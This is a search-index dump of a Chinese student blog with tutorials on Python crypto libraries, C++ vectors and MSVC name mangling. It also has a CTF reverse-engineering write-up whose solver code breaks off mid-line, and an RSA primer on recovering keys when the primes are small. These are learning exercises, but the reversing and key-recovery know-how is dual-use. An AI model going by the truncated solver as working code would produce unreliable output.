g\n总之功能就是非常多啦。。。https://github.com/JafarAkhondali/python3-libnum\nCrypto.Util.number # C y p t o , 永 远 滴 神 ~~~\nl = bytes_to_long(b)\nb = long_to_bytes(l) 这两个不用说好用到爆\ngetPrime(n) 返回一个随机的N位bit的素数\nd = inverse(e, n) 同样求逆模\nhttps://www.pycryptodome.org/en/latest/src/introduction.html\n","date":"30 March 2020","permalink":"/achieve/2019to2021/pycypto/","section":"archive","summary":"SymPy中数论部分使用说明 # sympy是一个Python的科学计算库，用一套强大的符号计算体系完成诸如多项式求值、求极限、解方程、求积分、微分方程、级数展开、矩阵运算等等计算问题 :D","title":"python密码学常用库"},{"content":" 自己博客就懒得放wp这种东西了,写一点总结性的东西，过几天吧密码学学习成果po出来好了 你是懒得pi爆\nRC4的奇淫技巧： # 主有还是用了a ^ b ^ a = b的技巧\nmessage ^ rc4_table = cypher cypher ^ message = rc4_table 内存、hex界面、寄存器 的配合使用来动态调试： # ​\t前段时间开始尝试不依赖 ida 跑 pe 文件以达到训练汇编和观察内存寄存器的能力\n如 g 键定位到目标地址，拖动窗口位置以便观察等操作，以后也许开一个 ida 奇淫技巧篇？（x） 事实证明还是派的上用场的，尝试在各种各样的虚拟机上跑ida的 dbgsrv ，远程动调熟练了总是好的\n​\t强行看汇编对汇编的编写能力应该也会有提升把？\n我语言能力一直很差，写这么多已经是极限了 ORZ\n","date":"20 March 2020","permalink":"/achieve/2019to2021/mrctf2020/","section":"archive","summary":"自己博客就懒得放wp这种东西了,写一点总结性的东西，过几天吧密码学学习成果po出来好了 你是懒得pi爆","title":"MRCTF_2020"},{"content":"\r简单实例: # #include\u0026lt;iostream\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;string\u0026gt; #include\u0026lt;vector\u0026gt; using namespace std; class local{ public: int x; int y; }; int main() { vector\u0026lt;int\u0026gt; a; vector\u0026lt;string\u0026gt; b; vector\u0026lt;local\u0026gt; c;//向量的申明 a.push_back(1); b.push_back(\u0026#34;acdc\u0026#34;); local l1;//类或者结构体要先初始再放进去 l1.x=1; l1.y=2; c.push_back(l1);//用于在队尾压入数据push_back成员函数 cout\u0026lt;\u0026lt;\u0026#34;a[0]=\u0026#34;\u0026lt;\u0026lt;a[0]\u0026lt;\u0026lt;endl; cout\u0026lt;\u0026lt;\u0026#34;b[0]=\u0026#34;\u0026lt;\u0026lt;b[0]\u0026lt;\u0026lt;endl; cout\u0026lt;\u0026lt;\u0026#34;c[0].x=\u0026#34;\u0026lt;\u0026lt;c[0].x\u0026lt;\u0026lt;\u0026#34;c[0].y=\u0026#34;\u0026lt;\u0026lt;c[0].y\u0026lt;\u0026lt;endl; a.push_back(2); cout\u0026lt;\u0026lt;\u0026#34;a_len=\u0026#34;\u0026lt;\u0026lt;a.size()\u0026lt;\u0026lt;endl;//成员函数size() a.pop_back();//pop_back()移除队尾元素 cout\u0026lt;\u0026lt;\u0026#34;a_len=\u0026#34;\u0026lt;\u0026lt;a.size()\u0026lt;\u0026lt;endl; system(\u0026#34;pause\u0026#34;); return 0; } /* 输出： a[0]=1 b[0]=acdcz c[0].x=1c[0].y=2 a_len=2 a_len=1 请按任意键继续. . */ 其他常用成员函数: # clrean()//清空向量 empty()//询问是否还有元素 迭代器 # 利用向量输出一个字符三角形： # #include\u0026lt;iostream\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;string\u0026gt; #include\u0026lt;vector\u0026gt; using namespace std; int main() { vector\u0026lt;string\u0026gt; a; vector\u0026lt;string\u0026gt;::iterator pa;//常规迭代器：可以修改值 vector\u0026lt;string\u0026gt;::const_iterator pb;//常量迭代器：不可以修改值 for(int i=0;i\u0026lt;10;i++) { string s; for(int j=0;j\u0026lt;i+1;j++) { s=s+\u0026#39;a\u0026#39;; } a.push_back(s); }//初始化一个三角形进去 for(pa=a.begin();pa!=a.end();pa++) cout\u0026lt;\u0026lt;*pa\u0026lt;\u0026lt;endl; cout\u0026lt;\u0026lt;\u0026#34;\\n\u0026#34;; system(\u0026#34;pause\u0026#34;); return 0; } /* 输出： a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa */ 和迭代器相关的常用函数： # insert(迭代器，元素)//向迭代器指向的前一位插入元素 erase（迭代器）//删除迭代器指向元素 ","date":"20 March 2020","permalink":"/achieve/2019to2021/cpp_vector/","section":"archive","summary":"简单实例: # #include\u0026lt;iostream\u0026gt; #include\u0026lt;stdlib.","title":"cpp_vector"},{"content":"\rbytes类型: # Python 3 新增了 bytes 类型，用于代表字节串（这是作者生造的一个词，与字符串对应）。字符串（str）由多个字符组成，以字符为单位进行操作；字节串（bytes）由多个字节组成，以字节为单位进行操作。\nbytes实例在python3中得到了大量使用（不知道为什么），在很多时候需要对其他类型的数据用bytes转一下才能用。\n结构：\nbytes(class bytes(source, encoding, errors) ) 根据source的不同，最终得到的输出结果也不同\n如果 source 为整数，则返回一个长度为 source 的初始化数组； 如果 source 为字符串，则按照指定的 encoding 将字符串转换为字节序列； 如果 source 为可迭代类型，则元素必须为[0 ,255] 中的整数； 如果 source 为与 buffer 接口一致的对象，则此对象也可以被用于初始- 化 bytearray（以后加） 果没有输入任何参数，默认就是初始化数组为0个元素 整数：\nb = bytes(3) print(b,type(b)) #输出： #b\u0026#39;\\x00\\x00\\x00\u0026#39; \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt; 字符串：\ns=\u0026#39;1234\u0026#39; s2=\u0026#39;牛批\u0026#39; b = bytes(s , encoding=\u0026#34;utf8\u0026#34;) b2 = bytes(s2 , encoding=\u0026#34;utf8\u0026#34;) print(b,type(b)) print(b2,type(b2)) \u0026#39;\u0026#39;\u0026#39; 输出： b\u0026#39;1234\u0026#39; \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt; b\u0026#39;\\xe7\\x89\\x9b\\xe6\\x89\\xb9\u0026#39; \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt; \u0026#39;\u0026#39;\u0026#39; 可迭代类型（list为首）：\nb = bytes([1, 2, 3]) print(b, type(b)) print(str(b)) #c = bytes([1, 2, 888]) # 888不再(0, 256之间)会报错 \u0026#39;\u0026#39;\u0026#39; 输出 b\u0026#39;\\x01\\x02\\x03\u0026#39; \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt; b\u0026#39;\\x01\\x02\\x03\u0026#39; \u0026#39;\u0026#39;\u0026#39; bytea类型的成员函数： ```python\nb=b\u0026rsquo;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08' print(b.hex()) #0102030405060708 (str)\nmap(): # 基本结构：\nmap( 函数，可迭代对象1,可迭代对象2......)\n函数：chr(),ord()\u0026hellip;..\n可迭代对象：list,字符串等可以用for遍历的对象 ##### 例子：\ndef f(x): return x+1 l1=[1,2,3,4] it=map(f,l1) #py2中直接返回list py3中返回一个迭代器 print(it) print(list(it)) #print(next(it)) #next 不能用于解析 map返回 要用list 输出:\n\u0026lt;map object at 0x000001A87E5AF788\u0026gt; [2, 3, 4, 5] 多个对象：\ndef f(x,y,z): return x+y+z l1=[1,2,3,4] l2=[4,3,2,1] l3=[1,2,3,4,] it=map(f,l1,l2,l3) print(it) print(list(it)) Output:\n\u0026lt;map object at 0x000001A544CE55C8\u0026gt; [6, 7, 8, 9] 例：\narr=[49,50,51,52] str=\u0026#39;1234\u0026#39; it = map(chr,arr) it2 = map(ord,str) print(it) print(list(it)) print(it2) print(list(it2)) 输出：\n\u0026lt;map object at 0x000001B95E7E8308\u0026gt; [\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;] \u0026lt;map object at 0x000001B95D8D2F88\u0026gt; [49, 50, 51, 52] join(): # s=\u0026#39;123\u0026#39; s1 = \u0026#34;-\u0026#34; s2 = \u0026#34;\u0026#34; seq = (\u0026#34;r\u0026#34;, \u0026#34;u\u0026#34;, \u0026#34;n\u0026#34;, \u0026#34;o\u0026#34;, \u0026#34;o\u0026#34;, \u0026#34;b\u0026#34;) # 字符串序列 print (s1.join( seq )) print (s2.join( seq )) a=\u0026#34;000\u0026#34;.join(s) #等价于 a=\u0026#34;000\u0026#34; # a.join(s) print(a) Output：\nr-u-n-o-o-b runoob 123 repr:(好吧这个不是很常用) # 把所有输出全部作为字符串输出\n\u0026gt;\u0026gt;\u0026gt;s = \u0026#39;RUNOOB\u0026#39; \u0026gt;\u0026gt;\u0026gt; repr(s) \u0026#34;\u0026#39;RUNOOB\u0026#39;\u0026#34; \u0026gt;\u0026gt;\u0026gt; dict = {\u0026#39;runoob\u0026#39;: \u0026#39;runoob.com\u0026#39;, \u0026#39;google\u0026#39;: \u0026#39;google.com\u0026#39;}; \u0026gt;\u0026gt;\u0026gt; repr(dict) \u0026#34;{\u0026#39;google\u0026#39;: \u0026#39;google.com\u0026#39;, \u0026#39;runoob\u0026#39;: \u0026#39;runoob.com\u0026#39;}\u0026#34; \u0026gt;\u0026gt;\u0026gt; ","date":"20 March 2020","permalink":"/achieve/2019to2021/py_useful/","section":"archive","summary":"bytes类型: # Python 3 新增了 bytes 类型，用于代表字节串（这是作者生造的一个词，与字符串对应）。字符串（str）由多个字符组成，以字符为单位进行操作；字节串（bytes）由多个字节组成，以字节为单位进行操作。","title":"python一些常用语法（自认为）"},{"content":"\rC编译器的函数名修饰规则 ： # __stdcall在输出函数名前加上一个下划线前缀，函数名后面加上一个“@”符号和其参数的字节数，例如_functionname@number。 __cdecl调用约定仅在输出函数名前加上一个下划线前缀，例如_functionname。 __fstcall在输出函数名前加上一个“@”符号，后面也是一个“@”和其参数的字节数，例如@functionname@number\nC++编译器的函数名修饰规则： # 以一个“?”开始，后跟函数名，再后面是参数表的开始标识和按照参数类型代号拼出的参数表。 __stdcall 开始标识是 “@@YG” __cdecl 是 “@@YA” __fastcall是 “@@YI”\n参数表的拼写代号如下所示： # X--void D--char E--unsigned char F--short H--int I--unsigned int J--long K--unsigned long（DWORD） M--float N--double _N--bool U--struct 其他参数表示 # 用PA表示指针，用PB表示const类型的指针。后面的代号表明指针类型，如果相同类型的指针连续出现，以“0”代替，一个“0”代表一次重复。 U表示结构类型，通常后跟结构体的类型名，用“@@”表示结构类型名的结束。函数的返回值不作特殊处理，和函数一样，紧跟着参数表的开始标志，也就是说，函数参数表的第一项实际上是表示函数的返回值类型。\n参数表后以“@Z”标识整个名字的结束，如果该函数无参数，则以“Z”标识结束。下面举两个例子，假如有以下函数声明：\nint Function1 (char *var1,unsigned long); 其函数修饰名为“?Function1@@YGHPADK@Z”，而对于函数声明： ?[name][调用方式][参数1][\t参数2]....[@z/z] void Function2(); 其函数修饰名则为“?Function2@@YGXXZ” 类的成员函数： # 主要结构： ?[name][类名][保护类型][参数1][\t参数2]....[@z/z] class CTest { private: void Function(int); protected: void CopyInfo(const CTest \u0026amp;src); public: long InsightClass(DWORD dwClass) const; 成员函数调用方式是__thiscall,在函数名和参数表之间插入“@”字符引导的类名\n三种类型表示： # 公有 public 标识“@@QAE” 保护 protected 标识是“@@IAE” 私有 private 标识是“@@AAE”\n对于成员函数Function，其函数修饰名为“?Function@CTest@@AAEXH@Z”\n?Function @CTest @@AAE XH@Z” 类名 私有 如果函数声明使用了const关键字，则相应的标识应分别为“@@QBE”，“@@IBE”和“@@ABE”。\n参数类型是类实例的引用,则使用“AAV1” CopyInfo( CTest \u0026amp;src) 若将其作为const类型的引用，则使用“ABV1” CopyInfo(const CTest \u0026amp;src)\n函数CopyInfo只有一个参数，是对类CTest的const引用参数，其函数修饰名为:\n?CopyInfo @CTest @@IAE X ABV1 @@Z protected 为const类型的引用 InsightClass是一个共有的const函数，它的成员函数标识是“@@QBE\u0026quot;:\n?InsightClass@CTest @@QBE J K @Z”。 public https://www.cnblogs.com/CodeMIRACLE/p/5343660.html\n","date":"14 March 2020","permalink":"/achieve/2019to2021/cppxiushi/","section":"archive","summary":"C编译器的函数名修饰规则 ： # __stdcall在输出函数名前加上一个下划线前缀，函数名后面加上一个“@”符号和其参数的字节数，例如_functionname@number。 __cdecl调用约定仅在输出函数名前加上一个下划线前缀，例如_functionname。 __fstcall在输出函数名前加上一个“@”符号，后面也是一个“@”和其参数的字节数，例如@functionname@number","title":"修饰函数规则"},{"content":"\rxctf-cycle graph # 没有其他乱七八糟的东西，就是算法\nint __usercall sub_401080@(char a1@) { void *Graph; // ecx@1 int v2; // edx@1 int v3; // eax@2 signed int t; // edx@3 char b; // al@3 signed int i; // edi@3 int a; // ecx@3 const char *v8; // eax@17 char v10; // [sp-Ch] [bp-30h]@3 int x; // [sp+0h] [bp-24h]@4 char flag; // [sp+8h] [bp-1Ch]@3 char v13; // [sp+9h] [bp-1Bh]@10 char v14; // [sp+Ah] [bp-1Ah]@11 char v15; // [sp+Bh] [bp-19h]@12 char v16; // [sp+Ch] [bp-18h]@13 char v17; // [sp+1Dh] [bp-7h]@14 ::t = 0; Graph = \u0026unk_403384; ::b = 48; v2 = 0; ::a = (int)\u0026address; do { v3 = root[v2]; ++v2; *((_DWORD *)Graph - 1) = v3; *(_DWORD *)Graph = (char *)\u0026address + 12 * branch1[v2]; *((_DWORD *)Graph + 1) = (char *)\u0026address + 12 * branch2[v2]; Graph = (char *)Graph + 12; } while ( (signed int)Graph \u003c (signed int)\u0026end );//生成图 sub_401020(\"You need a flag to get out of this:\\n\", a1); sub_401050(\"%s\", (unsigned int)\u0026flag); t = ::t; b = ::b; i = 5; a = ::a; do { x = *(\u0026flag + i); if ( *(_DWORD *)a + b == x )//将根的信息与flag比较 { a = *(_DWORD *)(a + 4);//走 branch1 、更新根的地址 } else { if ( b - *(_DWORD *)a != x ) { sub_401020(\"This is not flag~\\n\", v10); system(\"pause\"); exit(1); } a = *(_DWORD *)(a + 8);//走 branch2 、更新根的地址 } b = *(\u0026flag + i); ++t; ++i; ::b = b; ::a = a; ::t = t; } while ( i \u003c 21 ); if ( flag != 102 || v13 != 108 || v14 != 97 || v15 != 103 || v16 != 123 || v17 != 125 ) { v8 = \"illegal input~\\n\"; } else if ( t \u003e 16 || (_UNKNOWN *)a != \u0026end1 )//判断位置 { v8 = \"This is not flag~\\n\"; } else { v8 = \"Congratulations!!\\n\"; } sub_401020(v8, x); system(\"pause\"); return 0; } 这个图的结构还是有点意思，把一个大数组三个三个分开形成根节点和有向的路：\n0 1 3 ...... root branch1 branch2 ...... 拿到图的第一个反应就是该题不限步数的话一定有多解，完了还要还要检查ascii码的范围，最后我还是决定用寻路算法常用的递归\n撸代码： # #include \u0026ltiostream\u0026gt #include \u0026ltstdlib.h\u0026gt using namespace std; int root[90] = {0x34, 0x2, 0x2c, 0x2a, 0x6, 0x2a, 0x2f, 0x2a, 0x33, 0x3, 0x2, 0x32, 0x32, 0x32, 0x30, 0x3, 0x1, 0x32, 0x2b, 0x2, 0x2e, 0x1, 0x2, 0x2d, 0x32, 0x4, 0x2d, 0x30, 0x31, 0x2f, 0x33, 0x5}; int b1[90] = {0x2, 0x2, 0x1, 0x12, 0x7, 0x2, 0x1a, 0xd, 0x4, 0xa, 0x4, 0x15, 0xe, 0x1, 0x0, 0xe, 0x5, 0x7, 0x1c, 0xc, 0x1c, 0xf, 0xf, 0x2, 0x10, 0x17, 0x1e, 0x17, 0x13, 0x9, 0x16, 0x1f}; int b2[90] = {0x1, 0x8, 0x7, 0x17, 0x9, 0x13, 0x1f, 0x17, 0x9, 0xd, 0xc, 0x1d, 0xa, 0x18, 0x9, 0x18, 0x19, 0x9, 0x1a, 0x3, 0x16, 0x6, 0x11, 0xd, 0x7, 0xf, 0x14, 0x1, 0x10, 0x4, 0xb, 0x1f}; int b[90]; int ans[90]; int dir[90]; int flag[90]; void cheak() { int a = 48; int c; for(int i=0;i\u003c16;i++) { if(dir[i] == 1) { c = a + b[i]; if (c\u003c33 || c\u003e126) return; } if(dir[i] == 2) { c = a - b[i]; if (c\u003c33 || c\u003e126) return; } a = c; flag[i]=c; } cout\u003c\u003c\"flag{\"; for(int i=0;i\u003c16;i++) { printf(\"%c\",flag[i]); } cout\u003c\u003c\"}\"; cout\u003c","date":"10 March 2020","permalink":"/achieve/2019to2021/xctf2020/","section":"archive","summary":"xctf-cycle graph # 没有其他乱七八糟的东西，就是算法","title":"xctf2020-高校战役"},{"content":"\r初探RAS加密 # 加密准备: # 找两个比较大的质数 p 、q\n设 n = q * p\n设 f(n) = (p-1) * (q-1)\n找公钥 e 满足：1\u0026lt;e\u0026lt;f(n) 且 e、f(n) 互质\n找私钥 d 满足 : (d * e)% f(n) = 1\n加密算法: # 明文 M 和密文 C 满足： Me % n= c , Cd % n=M（明文和密文都被事先转换为数字） 已知M、e、n时RAS的如何解密（限于q，p不大的离谱的情况进行攻击）: # 要找 q，p，所以要对 n 因式分解\n有了 f(n) 就可以算 e*d %f(n) =1的逆模，利用计算机可以轻松求出 ( 已知 f(n) 又知 e 求 d 反之同理 )\n多因子RSA加密： # 找多个质数 P0 ， P1 ………… Pn\nn = P0 * P1 \u0026hellip;.. Pn\nphi = (P0-1) \u0026hellip;\u0026hellip; （Pn-1）\n其余步骤与常规rsa一致\n","date":"5 March 2020","permalink":"/achieve/2019to2021/%E5%88%9D%E6%8E%A2ras%E5%8A%A0%E5%AF%86/","section":"archive","summary":"初探RAS加密 # 加密准备: # 找两个比较大的质数 p 、q","title":"初探ras加密"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"}]